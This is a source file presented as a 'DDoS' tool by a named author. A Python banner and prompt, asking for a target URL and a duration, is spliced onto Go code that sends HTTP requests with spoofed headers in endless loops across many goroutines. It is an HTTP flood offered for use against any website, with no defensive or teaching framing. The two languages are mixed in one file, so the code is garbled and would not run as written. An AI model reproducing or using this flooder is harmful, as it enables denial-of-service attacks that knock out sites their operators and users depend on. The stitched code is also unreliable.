# BẢN QUYỀN THUỘC VỀ NGUYỄN THÀNH VINH
import os
from os import name, system
from pystyle import Colors, Colorate, Center
if name == 'nt':
    system("title NgThanhVinh - Indra")
    system("mode 101, 25")
os.system("cls" if os.name == "nt" else "clear")
panel = """
         [..              [..                 
         [..              [..                 
         [..[.. [..       [..[. [...   [..    
         [.. [..  [.. [.. [.. [..    [..  [.. 
         [.. [..  [..[.   [.. [..   [..   [.. 
         [.. [..  [..[.   [.. [..   [..   [.. 
         [..[...  [.. [.. [..[...     [.. [...
                                                                                            
                                                      LEGEND POWER DDOS BY NGUYỄN THÀNH VINH
"""
print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(panel)))
print()
host=input(Colorate.Diagonal(Colors.red_to_yellow, "   Nhập ./ URL Taget POST 15000: "))
time=int(input(Colorate.Diagonal(Colors.red_to_yellow, "   Đéo biết dùng thì tao cũng chịu : ")))
func httpflood(){
  head := header{"false", nil}
  sp := spoof{"127.0.0.1", 5}
  client := &fasthttp.Client{TLSConfig: &tls.Config{CurvePreferences: []tls.CurveID{tls.CurveP256, tls.CurveP384, tls.CurveP521, tls.X25519}}}
  req := fasthttp.AcquireRequest()
  req.SetRequestURI(target.url)
  req.Header.SetMethod(target.method)
  head.headers(req)
  sp.spoofS(req)
  for{
    client.Do(req, nil)
  }
}

func main(){
  target.url = os.Args[1]
  target.method = os.Args[2]
  threads, _ := strconv.Atoi(os.Args[3])
  log.Print("Bắt Đầu...")
  for i:=0; i < threads; i++{
    go httpflood()
  }

  <- make(chan bool, 1)
}

# NgThanhVinh :33
